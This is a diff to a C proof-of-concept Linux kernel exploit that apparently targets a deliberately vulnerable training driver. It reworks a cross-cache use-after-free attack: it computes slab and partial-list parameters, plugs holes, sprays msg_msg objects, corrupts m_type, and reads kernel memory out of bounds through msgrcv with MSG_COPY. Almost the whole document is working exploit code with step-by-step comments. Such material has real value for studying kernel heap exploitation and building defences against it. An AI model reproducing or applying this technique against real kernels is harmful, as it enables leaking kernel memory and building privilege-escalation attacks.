@@ -9,6 +9,8 @@
  *   - CONFIG_SLAB_BUCKETS
  *   - CONFIG_RANDOM_KMALLOC_CACHES
  *
+ * Ensure that CONFIG_CHECKPOINT_RESTORE=y to allow calling msgrcv() with the MSG_COPY flag.
+ *
  * This PoC performs out-of-bounds reading of the kernel memory using a corrupted msg_msg.
  */
 
@@ -73,32 +75,79 @@ int act(int act_fd, int code, int n, char *args)
 }
 
 /*
- * Cross-cache attack:
- *  - collect the needed info:
- *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
- *        120
- *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
- *        42
- *  - pin the process to a single CPU
- *  - create new active slab, allocate objs_per_slab objects
- *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
- *  - create new active slab, allocate objs_per_slab objects
- *  - obtain dangling reference from use-after-free bug
- *  - create new active slab, allocate objs_per_slab objects
- *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
- *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
- *  - allocate (objs_per_slab * 7) target objects to create and fill new target slab
- *  - perform uaf write using the dangling reference
- *  - execute the exploit primitive via the overwritten target object
+ * Collect the needed info for a cross-cache attack:
+ *
+ *  - Get the number of objects per slab containing a vulnerable object
+ *    (let's call it initial slab). For example,
+ *    /sys/kernel/slab/kmalloc-rnd-01-96/objs_per_slab is 42.
  */
 #define OBJS_PER_SLAB 42
-#define CPU_PARTIAL 120
 
+/*
+ *  - Get the number of per-CPU partial slabs in the initial kmem_cache
+ *    (see it in the slub_set_cpu_partial() kernel function or simply in gdb).
+ *    For example, kmem_cache.cpu_partial_slabs for kmalloc-rnd-01-96 is 6.
+ */
+#define CPU_PARTIAL_SLABS 6
+#define CPU_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS)
+
+/*
+ *  - Get the required minimum number of per-node partial slabs in the initial kmem_cache.
+ *    For example, /sys/kernel/slab/kmalloc-rnd-01-96/min_partial is 5.
+ */
+#define MIN_PARTIAL 5
+
+/*
+ *  - Calculate how many times we need to move per-CPU partial slabs to per-node
+ *    partial slabs to fill at least min_partial. Without this step, an empty slab
+ *    with the vulnerable object may stuck in the per-node partial list (cross-cache
+ *    attack failure).
+ */
+#define CPU_PARTIAL_TO_NODE_PARTIAL_N ((MIN_PARTIAL + CPU_PARTIAL_SLABS - 1) / CPU_PARTIAL_SLABS)
+#define NODE_PARTIAL_OBJS (OBJS_PER_SLAB * CPU_PARTIAL_SLABS * CPU_PARTIAL_TO_NODE_PARTIAL_N)
+
+/*
+ *  - Estimate the number of holes in the initial slab cache.
+ *    It can't be precise because these number change.
+ *    Calculate (num_objs - active_objs) from /proc/slabinfo for the initial slab cache:
+ *      cat /proc/slabinfo |grep "kmalloc-rnd-..-96" | awk '{print $1, $3 - $2}'
+ *    Take the biggest number of holes and multiply it by 2, for example (just to be safe).
+ *
+ *  - Estimate the number of holes in the final slab cache containing the spray objects.
+ *    Again, it can't be precise because these number change.
+ *    Calculate (num_objs - active_objs) from /proc/slabinfo for the final slab cache:
+ *      cat /proc/slabinfo |grep "msg_msg-96" | awk '{print $1, $3 - $2}'
+ *    On a clean system, there are no objects in the msg_msg-96, so this PoC has
+ *    no holes to plug in the final slab cache.
+ */
+#define HOLES 450
+
+/*
+ * Perform a cross-cache attack:
+ *  - pin the process to a single CPU
+ *  - plug the holes in the initial slab cache
+ *  - plug the holes in the final slab cache (skipped in this PoC)
+ *  - allocate objects for filling the per-node partial list later
+ *  - allocate objects for filling the per-CPU partial list later
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - allocate a vulnerable object
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list
+ *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
+ *  - free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list
+ *    (per-CPU partial list overflow pushed the slab with the uaf object to the page allocator)
+ *  - allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab
+ *  - perform uaf write using the dangling reference to the vulnerable object
+ *  - execute the exploit primitive via the overwritten spray object
+ */
+
+/* clang-format off */
 #define MSG_NORM_SIZE	DRILL_ITEM_SIZE - 48
 #define MSG_NORM_TYPE	5
 #define MSG_OOB_SIZE	0x2000
 #define BUF_OOB_SIZE	MSG_OOB_SIZE + 0x100
 #define MSG_OOB_TYPE	0xc001
+/* clang-format on */
 
 unsigned long *msgrcv_buf = NULL;
 int msqid = -1;
@@ -175,8 +224,17 @@ int main(void)
 	if (do_cpu_pinning(0) == EXIT_FAILURE)
 		goto end;
 
-	printf("[!] create new active slab, allocate objs_per_slab objects\n");
-	for (i = 0; i < OBJS_PER_SLAB; i++) {
+	printf("[!] the cross-cache settings:\n");
+	printf("\t OBJS_PER_SLAB: %d\n", OBJS_PER_SLAB);
+	printf("\t CPU_PARTIAL_SLABS: %d\n", CPU_PARTIAL_SLABS);
+	printf("\t CPU_PARTIAL_OBJS: %d\n", CPU_PARTIAL_OBJS);
+	printf("\t MIN_PARTIAL: %d\n", MIN_PARTIAL);
+	printf("\t CPU_PARTIAL_TO_NODE_PARTIAL_N: %d\n", CPU_PARTIAL_TO_NODE_PARTIAL_N);
+	printf("\t NODE_PARTIAL_OBJS: %d\n", NODE_PARTIAL_OBJS);
+	printf("\t HOLES: %d\n", HOLES);
+
+	printf("[!] plug the holes in the initial slab cache\n");
+	for (i = 0; i < HOLES; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -186,8 +244,18 @@ int main(void)
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 	reserved_from_n = current_n;
 
-	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
+	printf("[!] allocate objects for filling the per-node partial list later\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i++) {
+		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_ALLOC\n");
+			goto end;
+		}
+	}
+	current_n += i;
+	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] allocate objects for filling the per-CPU partial list later\n");
+	for (i = 0; i < CPU_PARTIAL_OBJS; i++) {
 		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -206,9 +274,14 @@ int main(void)
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
-	printf("[!] obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
-	printf("[+] done, uaf_n: %ld\n", uaf_n);
+	printf("[!] allocate a vulnerable object\n");
+	if (act(act_fd, DRILL_ACT_ALLOC, current_n, NULL) == EXIT_FAILURE) {
+		printf("[-] DRILL_ACT_ALLOC\n");
+		goto end;
+	}
+	uaf_n = current_n;
+	current_n++;
+	printf("[+] done, uaf_n: %ld, current_n: %ld (next for allocating)\n", uaf_n, current_n);
 
 	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
@@ -219,6 +292,15 @@ int main(void)
 	}
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-node partial list\n");
+	for (i = 0; i < NODE_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
+		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_FREE\n");
+			goto end;
+		}
+	}
+	printf("[+] done, next partial slab will push the per-CPU partial slabs to the per-node partial list\n");
 
 	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
 	current_n--; /* point to the last allocated */
@@ -230,22 +312,22 @@ int main(void)
 		}
 	}
 	current_n -= i;
-	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
+	assert(current_n < uaf_n); /* to be sure that the uaf object has been freed here */
 	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);
 
-	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
-	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
+	printf("[!] free 1 out of each objs_per_slab objects in the slabs reserved for the per-CPU partial list\n");
+	for (i = NODE_PARTIAL_OBJS; i < NODE_PARTIAL_OBJS + CPU_PARTIAL_OBJS; i += OBJS_PER_SLAB) {
 		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
 	}
-	/* Now current_n should point to the last element in the reserved slabs */
-	assert(reserved_from_n + i - 1 == current_n);
-	printf("[+] done, now go spraying\n");
+	/* Now current_n should point to the first element after the reserved slabs */
+	assert(reserved_from_n + i == current_n);
+	printf("[+] done, per-CPU partial list overflow pushed the slab with the uaf object to the page allocator\n");
 
-	printf("[!] allocate (objs_per_slab * 7) target objects to create and fill new target slab\n");
-	for (i = 0; i < OBJS_PER_SLAB * 7; i++) {
+	printf("[!] allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab\n");
+	for (i = 0; i < OBJS_PER_SLAB * 5; i++) {
 		ret = msgsnd(msqid, &msg_oob_r, sizeof(msg_oob_r.mtext), 0);
 		if (ret) {
 			perror("[-] realloc msgsnd");
@@ -254,7 +336,7 @@ int main(void)
 	}
 	printf("[+] msg_msg spraying is done\n");
 
-	printf("[!] perform uaf write using the dangling reference\n");
+	printf("[!] perform uaf write using the dangling reference to the vulnerable object\n");
 	/*
 	 * Overwrite msg_msg m_type:
 	 *  - m_type in msg_msg is at the offset 16;
@@ -275,8 +357,8 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	printf("[!] execute the exploit primitive via the overwritten target object\n");
-	for (i = 0; i < OBJS_PER_SLAB * 7; i++) {
+	printf("[!] execute the exploit primitive via the overwritten spray object\n");
+	for (i = 0; i < OBJS_PER_SLAB * 5; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, i, IPC_NOWAIT | MSG_COPY);
 		if (bytes == -1) {
 			perror("[-] msgrcv MSG_COPY");
@@ -306,7 +388,7 @@ int main(void)
 	result = EXIT_SUCCESS;
 
 end:
-	for (i = 0; ; i++) {
+	for (i = 0;; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, MSG_NORM_TYPE, IPC_NOWAIT);
 		if (bytes == -1)
 			break;
